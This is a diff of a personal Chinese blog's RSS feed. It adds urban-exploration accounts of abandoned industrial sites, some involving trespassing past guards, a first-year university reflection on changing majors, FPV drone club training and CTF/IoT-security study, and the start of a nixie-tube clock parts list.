+&lt;h3 id=&#34;躯壳&#34;&gt;躯壳
+&lt;/h3&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;目标：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX1_LNy5d3_nFdDSEXM4gOhJIXN3T1sv4-LVnOjN91jrDAjmwrzH-iYoX&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;位置：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX19417efWm3azvfYprdQKnmoukt0AwRL9dsHSxShbtBZWmC75_4Wgo9L&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;规模：&lt;/strong&gt; 中 | &lt;strong&gt;难度：&lt;/strong&gt; 低 | &lt;strong&gt;风险：&lt;/strong&gt; 低&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;这次是我来崇礼比赛，比完后的空闲时间顺带去的四个地方。&lt;/p&gt;
-&lt;h3 id=&#34;第一处&#34;&gt;第一处
-&lt;/h3&gt;&lt;p&gt;坐落于公园里的废弃飞机，和&lt;a class=&#34;link&#34; href=&#34;#%e8%b5%b7%e6%ba%90&#34; &gt;起源&lt;/a&gt;类似，无人管理。曾经旁边有棚子，可以顺着棚子爬上机翼，然后进入机舱，可我来的时候棚子已经拆除，周围没有任何落脚点，于是没能进入，拍了些照片就离开了&lt;/p&gt;
-&lt;h3 id=&#34;第二处&#34;&gt;第二处
-&lt;/h3&gt;&lt;p&gt;一片厂区，据说无法进入，但我还是去碰了碰运气。到达后顺着边缘走，走着走着就来到一片工地，工地和目的地相连，于是很简单的就进去了，第一个建筑中有一个长廊，左边是窗户，右边是锈蚀的机器，一眼望不到头。向前走一段路，就变成了前后都是无尽的长廊，再加上那天是阴天，外面的光不是很强烈，透过老窗户照进来，将这里变成了一个阈限空间，让我有一种在梦中的感觉。&lt;/p&gt;
-&lt;p&gt;爬窗出来后，到了一片杂草地，旁边的楼里是输送煤炭的管道。出来后就在周围寻找进入主厂区的路，但很遗憾花了很长时间都没有找到。于是我原路返回，在厂区外围绕了一圈，找到一个锁住的大门，和一个路边摆放的水泥管，高度和围墙相当。大门确认没有办法打开或者钻进去，爬上水泥管倒是可以跳进去，但考虑到这里和厂区隔着100米的杂草地，而且不知道该怎么出来，于是还是放弃了&lt;/p&gt;
-&lt;h3 id=&#34;第三处&#34;&gt;第三处
-&lt;/h3&gt;&lt;p&gt;坐车来到一个偏僻小镇，然后来到一处乡村一样的地方，下了公交车后爬了一段坡到达目的地。这里有几栋住宅楼和两栋主楼，由于住宅楼没什么特点就没有进去。第一栋主楼是天窗结构，屋顶全部是玻璃，楼中间是空的，只有四周有走廊和房间，这样的结构导致有一只鸟飞进来只会向上撞玻璃而无法出去，我尝试解救，但失败了，只好作罢，出门的时候在地上见到一只螳螂，才发现我已经很多年没见过螳螂了。&lt;/p&gt;
-&lt;p&gt;第二栋楼是活动室，但貌似有人曾在这里拍戏，地上有很多垃圾，墙面也很脏，让人不爽。只有走廊稍稍有点特点，其他地方很普通。到了顶楼，昏暗的环境下是一座窗边的雕像，再往另一边走，是某个大佬的涂鸦。这里是楼正面尖顶的房间，整个房间的墙上都遍布涂鸦，大概是这个废墟最独特的地方&lt;/p&gt;
-&lt;h3 id=&#34;第四处&#34;&gt;第四处
-&lt;/h3&gt;&lt;p&gt;这是一处烂尾楼，比起其他废墟少了一些生活气息，也就是没有灵魂，作为此行附带的地点而去。门口有保安但墙很容易翻，翻进去后小心翼翼的行走，躲过了保安和狗，就进入楼中&lt;/p&gt;
+&lt;p&gt;这是一处烂尾楼，比起其他废墟少了一些生活气息，也就是没有灵魂，作为此行附带的地点而去。门口有保安但墙很容易翻，翻进去后小心翼翼的行走，躲过了保安和狗，就进入楼中&lt;/p&gt;
 &lt;p&gt;楼的结构确实很美，不过也仅此而已了，四处转了转，拍了一些照片，我就踏上了回程。&lt;/p&gt;
 &lt;h2 id=&#34;直到大厦崩塌&#34;&gt;直到大厦崩塌
 &lt;/h2&gt;&lt;blockquote&gt;
@@ -13164,7 +13735,19 @@ hostname为虚拟局域网给OpenWrt设备分配的IP地址&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;位置：&lt;/strong&gt; ``&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;时间：&lt;/strong&gt; 26.3.23 | &lt;strong&gt;人数：&lt;/strong&gt; 1 | &lt;strong&gt;规模：&lt;/strong&gt; 小 | &lt;strong&gt;难度：&lt;/strong&gt; 无 | &lt;strong&gt;风险：&lt;/strong&gt; 低&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;喜爱程度&#34;&gt;喜爱程度
+&lt;h2 id=&#34;艺术之坟&#34;&gt;艺术之坟
+&lt;/h2&gt;&lt;p&gt;这里由两部分组成，第一部分面积比较小，没有任何遮拦，从马路边就能走进去，我先进入了这里。
+首先是一处小型的传送带，已经被拆的七零八落，我简单探索了一下就来到主楼。这里的墙上画满了涂鸦，而且质量还算不错，彩色的涂鸦和锈蚀的机器在阳光照耀下产生强烈的对比，很有特色。本想拍一些照片，但当时光线不太好，我随意拍了几张便离开了
+之后就来到另一个大的区域，本来按理说应该翻墙进去，但网上意外搜索到了另一条路线，于是我从旁边的停车场绕了进去，避免了翻墙造成的麻烦
+接近目的地时，我听到一些说话和笑声，还以为是有人在里面聊天，结果，到了以后，路上冒出来一个小孩拿着枪指我，我看了看周围，才意识到是一个培训班在教一群小孩军事，让这里变得很吵闹。我有些烦躁，便没有理他们径直向废墟深处走去。
+首先是废弃的铁轨和涂鸦，这里可以看到刚刚的那个建筑，等待小孩离开后，我来到最中间的那栋建筑。一楼是一些涂鸦和字，我觉得很平常，但上了二楼，看见墙上写的一些意象 感觉出现在废墟中很奇妙。
+出来后我来到了对面的楼，这里每个房间都布满涂鸦，但也能看见一些毁坏的痕迹，感觉很可惜，再向着门口那边走，有一个废弃的机器，在门口旁边是一个废旧的厂房，2楼有一个画的很不错的画，看完以后我又回到主楼区域，拍了一些照，便离开了。我又回到了最开始都区域，这时阳光正好，照在机器与上面的涂鸦上，在这里我拍了几张很不错的照片，然后就离开了。整体来看这里是我这段时间去过的最好的废墟&lt;/p&gt;
+&lt;h2 id=&#34;时间夹缝中的红星&#34;&gt;时间夹缝中的红星
+&lt;/h2&gt;&lt;p&gt;这个地方是一处居民区旁边的旧厂区，来之前听说已经彻底封锁进不去了，但我还是想着过来碰碰运气&lt;/p&gt;
+&lt;h2 id=&#34;镜中自我&#34;&gt;镜中自我
+&lt;/h2&gt;&lt;p&gt;这里在山的旁边，周围有美术学校，路边还有很有创意的装饰，来到旁边，可以看到门是紧锁的，但再往前走，有一个不明显的岔路通往山里，右边是细细的林中小道。沿着小道一直向前，翻过一扇窗，就到达目的地&lt;/p&gt;
+&lt;h2 id=&#34;一座城市的衰落&#34;&gt;一座城市的衰落
+&lt;/h2&gt;&lt;h2 id=&#34;喜爱程度&#34;&gt;喜爱程度
 &lt;/h2&gt;&lt;ol&gt;
 &lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#%e9%81%97%e7%95%99%e7%89%a9&#34; &gt;遗留物&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#%e6%ad%bb%e4%b8%8e%e6%96%b0%e7%94%9f&#34; &gt;死与新生&lt;/a&gt;&lt;/li&gt;
@@ -13174,6 +13757,13 @@ hostname为虚拟局域网给OpenWrt设备分配的IP地址&lt;/p&gt;
 &lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#%e6%bd%9c%e8%a1%8c%e6%8a%80%e8%83%bd%e5%8a%a0%e4%b8%80&#34; &gt;潜行技能加一&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#%e6%af%94%e8%b5%9b%e4%b9%8b%e6%97%85&#34; &gt;比赛之旅&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;h2 id=&#34;失败的探索&#34;&gt;失败的探索
+&lt;/h2&gt;&lt;p&gt;水泥厂
+一觉起来，本来想坐公交过去，但考虑到需要等的时间不确定，就打车了，结果刚刚打到车，就发现我坐的那路车从眼前开过去。终于到了目的地，却发现门口有保安，还问我怎么来这里，我只好说我走错了，然后沿着一侧的水沟前进，终于到了工厂的东侧，这里的铁门开着，门口没有保安，虽然门上写着禁止进入，但这么好的机会，必须得试试，于是我就进去了，这里其实已经到了厂子内部，我赶快向里走，可还没等我走到安全区域，保安就从旁边的住宅楼喊我，我只好放弃，然后继续向前走，走到了厂房尽头都没有找到人口
+之后又想到网上查到可以从银杏林进入，银杏林在厂区的西边，于是我像向那边走去，没走多远看到一个大哥还问我怎么一直在这转，然后我只好撒谎说去附近的景点，他还给我指路。经过漫长的行走，终于到了目的地，可是转了几圈并没有找到人口，我只得放弃，不过这里的环境还不错，于是我在附近转了几圈，居然又遇到了刚刚的大哥，最后实在太累了，就坐公交返回了&lt;/p&gt;
+&lt;p&gt;民丰&lt;/p&gt;
+&lt;p&gt;影剧院&lt;/p&gt;
+&lt;p&gt;幼儿园&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -15565,42 +16155,41 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 </description>
         </item>
         <item>
-        <title>[随记]2025大一总结</title>
+        <title>2025大一总结</title>
         <link>https://th4uma.github.io/post/2025/</link>
         <pubDate>Thu, 26 Jun 2025 12:05:13 +0800</pubDate>
         
         <guid>https://th4uma.github.io/post/2025/</guid>
-        <description>&lt;img src="https://th4uma.github.io/images/cover/zj0.jpg" alt="Featured image of post [随记]2025大一总结" /&gt;&lt;h1 id=&#34;随记2025大一总结&#34;&gt;[随记]2025大一总结
-&lt;/h1&gt;&lt;p&gt;不知不觉大一已经结束，还有两个月就要变成中登了，有些压力。这一年学的东西并不多，但还是有不少收获，主要是心态方面的转变&lt;/p&gt;
+        <description>&lt;img src="https://th4uma.github.io/images/cover/zj0.jpg" alt="Featured image of post 2025大一总结" /&gt;&lt;p&gt;不知不觉大一已经结束，还有两个月就要变成中登了，有些压力。这一年学的东西并不多，但还是有不少收获，主要是心态方面的转变&lt;/p&gt;
 &lt;h2 id=&#34;心理篇&#34;&gt;心理篇
 &lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;——一句话总结，就是无尽的焦虑和痛苦 。&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;噩梦的开始&#34;&gt;噩梦的开始
-&lt;/h3&gt;&lt;p&gt;​	没能进到喜欢的信息安全专业，而是被录取到了电子商务，这是我想都没想过的。曾经梦想中和从他人口中得知的大学是时间自由，可以尽情学喜欢东西的地方。但现实是每天上着无聊又没价值的课，看到所有系统里自己的专业都是电子商务，心里慢慢只剩下恶心。以前只是觉得这个专业没什么技术含量，现在完全变成了我最不想提起的存在，每天看到同学与老师，专业与学院，我心里都会有一种强烈的异样感：我不属于这里。&lt;/p&gt;
-&lt;p&gt;​	尽管如此，我还是有希望逃离。学校一共有3次转专业机会，完全可以转入自己喜欢的专业，但是有一个致命的问题：本专业成绩好才能转。要成绩好就只能忍着恶心，浪费时间在不喜欢的东西上，一上不喜欢的课就加重焦虑和痛苦，导致我难以集中精力，反而没心思学习。再加上家乡和浙江的教育资源、高考压力不一样，我一入学就落后其他同学不少，这让我的希望逐渐渺茫。&lt;/p&gt;
-&lt;p&gt;​	之后就陷入了恶性循环，焦虑了一整学期，基本没学进去什么，也几乎失去了希望，慢慢变得一遇到问题就怪环境，对别人要求高，对自己却总找借口，遇到困难第一反应就是躺平。就这样，不愿再次回想的大一上学期结束了。&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;​	没能进到喜欢的信息安全专业，而是被录取到了电子商务，这是我想都没想过的。曾经梦想中和从他人口中得知的大学是时间自由，可以尽情学喜欢东西的地方。但现实是每天上着无聊又没价值的课，看到所有系统里自己的专业都是电子商务，心里慢慢只剩下恶心。以前只是觉得这个专业没什么技术含量，现在完全变成了我最不想提起的东西，每天看到同学老师，专业学院，我心里都会有一种强烈的异样感：我不属于这里&lt;/p&gt;
+&lt;p&gt;​	尽管如此，我还是有希望逃离。学校一共有3次转专业机会，完全可以转入自己喜欢的专业，但是有一个致命的问题：本专业成绩好才能转。要成绩好就只能忍着恶心，浪费时间在不喜欢的东西上，一上不喜欢的课就加重焦虑和痛苦，导致我难以集中精力，反而没心思学习。再加上家乡和浙江的教育资源和高考压力不一样，我一入学就落后其他同学不少，这让我的希望逐渐渺茫&lt;/p&gt;
+&lt;p&gt;​	之后就陷入了恶性循环，焦虑了一整学期，基本没学进去什么，也几乎失去了希望，慢慢变得一遇到问题就怪环境，对别人要求高，对自己却总找借口，遇到困难第一反应就是躺平。就这样，不愿再次回想的大一上学期结束了&lt;/p&gt;
 &lt;h3 id=&#34;一丝希望&#34;&gt;一丝希望
-&lt;/h3&gt;&lt;p&gt;​	第一学期结束就可以报名转专业了，我一共报名了三种，普通，卓越和双学位。命运给我了一个好机会，学校新开的这个双学位专业里面包含信息安全，而我在寒假奇迹般的以9/10的排名被录取，可喜可贺。&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;​	第一学期结束就可以报名转专业了，我一共报名了三种，普通，卓越和双学位。命运给我了一个好机会，学校新开的这个双学位专业里面包含信息安全，而我在寒假奇迹般的以9/10的排名被录取，可喜可贺&lt;/p&gt;
 &lt;h3 id=&#34;迷茫与后悔&#34;&gt;迷茫与后悔
-&lt;/h3&gt;&lt;p&gt;​	虽然转了专业，但新专业的课程是一半网安一半管理。无论是课程中，还是专业名中，抑或是我所属的管理学院中，一看到管理，我就会想起之前的痛苦，感受到强烈的恶心。我开始迷茫到底应该继续转专业还是留在这里，同时对上学期被浪费掉感到后悔。曾经参加过那么多比赛，几乎每次都可以拿到前几名，那些曾让我骄傲的技能，在一条条比赛群的消息里，在别人的讨论中变得那么陌生，我甚至连插一句话都觉得多余。这让我越来越自卑，不愿接受自己已经泯然众人的事实。尽管已经脱离了困境，但我的焦虑也并没有被缓解，只有痛苦减轻。&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;​	虽然转了专业，但新专业的课程是一半网安一半管理。无论是课程中，还是专业名中，抑或是我所属的管理学院中，一看到管理，我就会想起之前的痛苦，感受到强烈的恶心。我开始迷茫到底应该继续转专业还是留在这里，同时对上学期被浪费掉感到后悔。曾经参加过那么多比赛，几乎每次都可以拿到前几名，那些曾让我骄傲的技能，在一条条比赛群的消息里，在别人的讨论中变得那么陌生，我甚至连插一句话都觉得多余。这让我越来越自卑，不愿接受自己已经泯然众人的事实。尽管已经脱离了困境，但我的焦虑也并没有被缓解，只有痛苦减轻&lt;/p&gt;
 &lt;p&gt;​	我也开始承担上学期恶习导致的恶果，这学期整个人变得过于松懈，注意力差、做事没耐心、不愿动脑思考，这些问题没随着压力减轻而好转，而是将我拖向深渊，每天上课提不起劲，还总是打着自学的幌子玩手机，自己都觉得难以接受。不过唯一的进步就是心情变好，也有心思自学一些东西，研究自己的爱好了(^_^)。就这样，浑浑噩噩的大一下学期结束了&lt;/p&gt;
 &lt;h3 id=&#34;改变&#34;&gt;改变
-&lt;/h3&gt;&lt;p&gt;​	从寒假开始就已经有改变现状的想法，但一想到改变，就想到之前浪费的时光、和他人的差距、自己的失败，所以一次次焦虑，给自己找借口，导致整整一学期我的改变都微乎其微。期末，我突然觉得如果再不真正做出改变，就彻底赶不上其他人了，美好的大学生活也将离我而去。至于改变的方法，由于之前学习完都只留下记忆，非常虚无缥缈，而且如果忘记，就和没有学过差不多，因此我选择了写博客记录下学习的过程，为了让我在努力这件事至少能被我自己看见。&lt;/p&gt;
-&lt;p&gt;​	我认为仅仅过完了一个大一，时间还来得及，我不再跟那些社团里的大佬比较，专注提升自己，哪怕最后不如他们，也比现在这样更好。现在想想，我注重知识的广度，他们注重知识的深度，也许我并不落后于他们，只是我没发现罢了。&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;​	从寒假开始就已经有改变现状的想法，但一想到改变，就想到之前浪费的时光、和他人的差距、自己的失败，所以一次次焦虑，给自己找借口，导致整整一学期我的改变都微乎其微。期末我突然觉得如果再不真正做出改变，就彻底赶不上其他人了，美好的大学生活也将离我而去。至于改变的方法，由于之前学习完都只留下记忆，非常虚无缥缈，而且如果忘记，就和没有学过差不多，因此我选择了写博客记录下学习的过程，为了让我在努力这件事至少能被我自己看见&lt;/p&gt;
+&lt;p&gt;​	我认为仅仅过完了一个大一，时间还来得及，我不再跟那些社团里的大佬比较，专注提升自己，哪怕最后不如他们，也比现在这样更好。现在想想，我注重知识的广度，他们注重知识的深度，也许我并不落后于他们，只是我没发现罢了&lt;/p&gt;
 &lt;h3 id=&#34;当局者迷&#34;&gt;当局者迷
-&lt;/h3&gt;&lt;p&gt;我上面所提到的状态差、焦虑，也许都是我为自己的懒惰找的借口，真正的事实是我好吃懒做的度过了大一也说不定，这件事的答案我目前无从得知。&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;我上面所提到的状态差、焦虑，也许都是我为自己的懒惰找的借口？真正的事实是我好吃懒做的度过了大一也说不定，这件事的答案我目前无从得知&lt;/p&gt;
 &lt;h2 id=&#34;社团篇&#34;&gt;社团篇
-&lt;/h2&gt;&lt;p&gt;今年上半学期，加入了0RATYS和航模社，这既是我的希望与梦想，也是我一部分的压力来源。&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;今年上半学期，加入了0RATYS和航模社，这既是我的希望与梦想，也是我一部分的压力来源&lt;/p&gt;
 &lt;h3 id=&#34;航模&#34;&gt;航模
 &lt;/h3&gt;&lt;h4 id=&#34;加入&#34;&gt;加入
-&lt;/h4&gt;&lt;p&gt;​	入社考核分为两次，一是飞手选拔，二是方向选择。第一次考了sw画火火箭和cad画fpv，还有最重要的模拟器。&lt;/p&gt;
+&lt;/h4&gt;&lt;p&gt;​	入社考核分为两次，一是飞手选拔，二是方向选择。第一次考了sw画火火箭和cad画fpv，还有最重要的模拟器&lt;/p&gt;
 &lt;p&gt;​	我是初中就玩过固定翼的究极老登，虽然玩了好几年连一个航线都飞不下来，再加上多年没碰，但依旧手感爆发，第一次训练飞完航线，之后甚至练会了倒飞，最后理所当然的模拟器分数第一，总分前几。这是我设计的火火箭&lt;/p&gt;
 &lt;img src=&#34;zj1.png&#34; style=&#34;width: 40%;&#34; /&gt;
-&lt;p&gt;​	然后就是分方向，按理说我更适合玩固定翼，也确实喜欢，但是高中就憧憬fpv，感觉fpv又好玩又帅，再说了高中幻想系列总得实现一个吧，于是就选了微折。结果进群后发现5人只能进2人。当时听说固定翼组依旧统一训练，暂时不细分方向，我就一直以为被微折淘汰掉就跟固定翼一起训练了，后面才知道淘汰就寄了，好险(&amp;gt;_&amp;lt;)。&lt;/p&gt;
-&lt;p&gt;​	当时其实并没有抱太大希望能进组，因为同组有两个同学有基础，训练时非常熟练，另外两个同学选择了退出。我也被组长劝退过，因为他认为我先加入固定翼组再额外学习fpv会更容易，但我不服输，还是坚持下来。最终考核有模拟器，焊接，理论，模拟器我不如别人，没有时间加分，但没扣基础分，焊接我拿到了98高分，大概是手比较稳。理论分数不高，由于我当时有些失去希望，就没怎么准备。但最后我居然以0.2的分差超过了最后的同学进来了，最幸运的一集。&lt;/p&gt;
+&lt;p&gt;​	然后就是分方向，按理说我更适合玩固定翼，也确实喜欢，但是高中就憧憬fpv，感觉fpv又好玩又帅，再说了高中幻想系列总得实现一个吧，于是就选了微折。结果进群后发现5人只能进2人。当时听说固定翼组依旧统一训练，暂时不细分方向，我就一直以为被微折淘汰掉就跟固定翼一起训练了，后面才知道淘汰就寄了，好险(&amp;gt;_&amp;lt;)&lt;/p&gt;
+&lt;p&gt;​	当时其实并没有抱太大希望能进组，因为同组有两个同学有基础，训练时非常熟练，另外两个同学选择了退出。我也被组长劝退过，因为他认为我先加入固定翼组再额外学习fpv会更容易，但我不服输，还是坚持下来。最终考核有模拟器，焊接，理论，模拟器我不如别人，没有时间加分，但没扣基础分，焊接我拿到了98高分，大概是手比较稳。理论分数不高，由于我当时有些失去希望，就没怎么准备。但最后我居然以0.2的分差超过了最后的同学进来了，最幸运的一集&lt;/p&gt;
 &lt;h4 id=&#34;练习&#34;&gt;练习
-&lt;/h4&gt;&lt;p&gt;​	成功加入后就是每周去航模室训练，寒假照着图片复刻了队里的fpv图纸!&lt;img src=&#34;zj2.png&#34; style=&#34;width: 60%;&#34; /&gt;&lt;/p&gt;
+&lt;/h4&gt;&lt;p&gt;​	成功加入后就是每周去航模室训练，寒假照着图片复刻了队里的fpv图纸&lt;img src=&#34;zj2.png&#34; style=&#34;width: 60%;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;3月我第一次学会设置飞机，然后第一次飞了真机。练了一个月悬停，终于从一飞就炸机到稳定悬停。月底第一次戴眼镜飞行，没过多久，4月初我就有了自己的第一架fpv&lt;/p&gt;
 &lt;img src=&#34;zj3.jpg&#34; style=&#34;width: 50%;&#34; /&gt;
 &lt;p&gt;5月初，我感觉目前用顶级的图传有些没必要而且浪费，再加上总担心炸坏，于是把o4pro拆下来卖了换成小o4，还有了自己的工位。暑假即将开始半个月的训练，我会把这项爱好一直坚持下去&lt;/p&gt;
@@ -15608,33 +16197,33 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 &lt;/h3&gt;&lt;h4 id=&#34;加入前&#34;&gt;加入前
 &lt;/h4&gt;&lt;p&gt;​	高中就非常坚定大学要学网安，入学以后自然是要加入网安社。其实刚开始想加入vidar-team，也听了他们的几次讲座，而0RAYS的讲座总是刚好碰上我有事的时候，就没能听上（悲。第一学期两个社团都有新生赛，可是当时我的全部精力都放在转专业上，导致没有一场新生赛拿到好成绩，尤其是0RAYS的新生赛一道题也没有做出来，可他们还是让我加了进来，泪目&lt;/p&gt;
 &lt;h4 id=&#34;迷茫&#34;&gt;迷茫
-&lt;/h4&gt;&lt;p&gt;​	加入后就是一学期的迷茫，因为感觉其他同学都学的好快，懂得好多，而我不知道该从哪里入手，也不太敢和他们交流。再加上这学期的心态问题，导致大半学期过去就学了一些简单的misc基础，刷完了buuctf上面misc的前三页题目。工作室我也不敢去，觉得自己什么都不会，去了也帮不上忙，而且没熟人，去了会尴尬。每次比赛就阴暗的窝在寝室看别人解题，想自己试试发现跟不上，完全不会，所以基本都是负反馈，有点难受(´°̥̥̥̥̥̥̥̥ω°̥̥̥̥̥̥̥̥｀)&lt;/p&gt;
+&lt;/h4&gt;&lt;p&gt;​	加入后就是一学期的迷茫，因为感觉其他同学都学的好快，懂得好多，而我不知道该从哪里入手，也不太敢和他们交流。再加上这学期的心态问题，导致大半学期过去就学了一些简单的misc基础，刷完了buuctf上面misc的前三页题目。工作室我也不敢去，觉得自己什么都不会，去了也帮不上忙，而且没熟人，去了会尴尬。每次比赛就阴暗的窝在寝室看别人解题，想自己试试发现跟不上，完全不会，所以基本都是负反馈，有点难受&lt;/p&gt;
 &lt;h4 id=&#34;反思&#34;&gt;反思
-&lt;/h4&gt;&lt;p&gt;​	后来想明白，既然这样干脆就不要纠结比赛，把目光放在学习本身。无人机，网安，电子制作是我喜欢的东西，那么我现在应该结合我的兴趣，所以我决定转到iot安全方向，也许有一天能将它和FPV结合。&lt;/p&gt;
-&lt;p&gt;​	就这样开始新一轮的学习，队里的学长建议我复现esp32thuctf的题目，于是我就先看了esp32的教程，想看完教程再复现。后来发现这样根本记不住，学习方法有问题，于是就决定先跟着wp做一遍，然后让gpt帮我一点点分析代码，同时学习。&lt;/p&gt;
+&lt;/h4&gt;&lt;p&gt;​	后来想明白，既然这样干脆就不要纠结比赛，把目光放在学习本身。无人机，网安，电子制作是我喜欢的东西，那么我现在应该结合我的兴趣，所以我决定转到iot安全方向，也许有一天能将它和FPV结合&lt;/p&gt;
+&lt;p&gt;​	就这样开始新一轮的学习，队里的学长建议我复现esp32thuctf的题目，于是我就先看了esp32的教程，想看完教程再复现。后来发现这样根本记不住，学习方法有问题，于是就决定先跟着wp做一遍，然后让gpt帮我一点点分析代码，同时学习&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;还有一件有趣的事：高一时我犯中二病，幻想成为大黑客时，买了无线网卡破解WiFi（当然没成功），而现在我居然又在用那个网卡抓包，算是一种莫名其妙的轮回。&lt;/p&gt;
+&lt;p&gt;还有一件有趣的事：高一时我有中二病，幻想成为大黑客时，买了无线网卡破解WiFi（失败 ），而现在我居然又在用那个网卡抓包，算是一种莫名其妙的轮回&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;总结&#34;&gt;总结
 &lt;/h3&gt;&lt;p&gt;总体上来看这学期对航模的学习比较不错，跟上了进度，也进步很多，但网安方面我对自己并不满意。如果高中的我看到现在的我，一定会说 &lt;strong&gt;你这一年都在干什么，我的梦想被你搞砸了&lt;/strong&gt;。为了补偿曾经那心怀梦想的自己，我觉得我必须行动起来了&lt;/p&gt;
 &lt;h2 id=&#34;学习篇&#34;&gt;学习篇
 &lt;/h2&gt;&lt;h3 id=&#34;成果&#34;&gt;成果
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;solidworks基本使用&lt;/li&gt;
-&lt;li&gt;ctf misc基础&lt;/li&gt;
-&lt;li&gt;手机root&lt;/li&gt;
-&lt;li&gt;fpv的飞行与组装&lt;/li&gt;
-&lt;li&gt;esp32thuctf复现 （一半）&lt;/li&gt;
-&lt;li&gt;跟着大佬们打了几个ctf比赛（基本不会）&lt;/li&gt;
-&lt;li&gt;第一个电子制作项目辉光管时钟（开源复刻）（一半）&lt;/li&gt;
+&lt;li&gt;Solidworks基本使用&lt;/li&gt;
+&lt;li&gt;CTF misc基础&lt;/li&gt;
+&lt;li&gt;手机Root&lt;/li&gt;
+&lt;li&gt;FPV的飞行与组装&lt;/li&gt;
+&lt;li&gt;ESP32 Thuctf复现 （一半）&lt;/li&gt;
+&lt;li&gt;跟着大佬们打了几个CTF比赛（基本不会）&lt;/li&gt;
+&lt;li&gt;第一个电子制作项目：开源复刻辉光管时钟（一半）&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;近期想学&#34;&gt;近期想学
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;c和c++，读完c primer plus和c++ primer plus&lt;/li&gt;
-&lt;li&gt;电子制作入门，小时候玩过很长时间arduino uno，用的图形化编程，突然学esp32有些不习惯，主要是freertos不熟悉，可以先学arduino和画板子&lt;/li&gt;
-&lt;li&gt;ctf iot，下学期重点学习，虽然已经比其他同学落后一年，不求打出成绩，只是我当时打这个比赛的初衷要实现，也就是学知识&lt;/li&gt;
-&lt;li&gt;街攀（优先级低）高中幻想系列，如果航模之后比赛能拿个好成绩，就把fpv练习时间拿一部分给街攀&lt;/li&gt;
-&lt;li&gt;跑酷（遥远）高中幻想系列，但还是先脱离现在这个死宅样子再说吧&lt;/li&gt;
+&lt;li&gt;C和C++：读完c primer plus和c++ primer plus&lt;/li&gt;
+&lt;li&gt;电子制作入门：小时候玩过很长时间arduino uno，用的图形化编程，突然学ESP32有些不习惯，主要是Freertos不熟悉，可以先学arduino和画板子&lt;/li&gt;
+&lt;li&gt;CTF iot：下学期重点学习，虽然已经比其他同学落后一年，不求打出成绩，只是我当时打这个比赛的初衷要实现，也就是学知识&lt;/li&gt;
+&lt;li&gt;街攀：高中幻想系列，优先级低，如果航模之后比赛能拿个好成绩，就把fpv练习时间拿一部分给街攀&lt;/li&gt;
+&lt;li&gt;跑酷：高中幻想系列，但还是先脱离现在这个死宅样子再说吧&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;暑假安排&#34;&gt;暑假安排
 &lt;/h3&gt;&lt;ul&gt;
@@ -15642,7 +16231,7 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 &lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; espctf复现完成&lt;/li&gt;
 &lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 辉光管时钟做完&lt;/li&gt;
 &lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 宿舍网络与设备的方案做好，开学动工&lt;/li&gt;
-&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 刷iot安全的题&lt;/li&gt;
+&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 刷IoT安全的题&lt;/li&gt;
 &lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 改掉焦虑就玩手机停不下来的坏毛病&lt;/li&gt;
 &lt;/ul&gt;
 </description>
@@ -15710,250 +16299,250 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 &lt;p&gt;今年2月产生了想制作一个《命运石之门》中世界线变动率探测仪的想法，上网查资料后了解到可以做成时钟并还原外观，于是开始复刻开源项目，目的是学习电子制作基础。本项目基于51单片机制作，采用寿命较长，市面存量较大，外观较还原的IN-14辉光管，总成本925.5元&lt;/p&gt;
 &lt;h2 id=&#34;物品清单&#34;&gt;物品清单
 &lt;/h2&gt;&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;名称&lt;/th&gt;
-          &lt;th&gt;作用&lt;/th&gt;
-          &lt;th&gt;数量&lt;/th&gt;
-          &lt;th&gt;价格&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
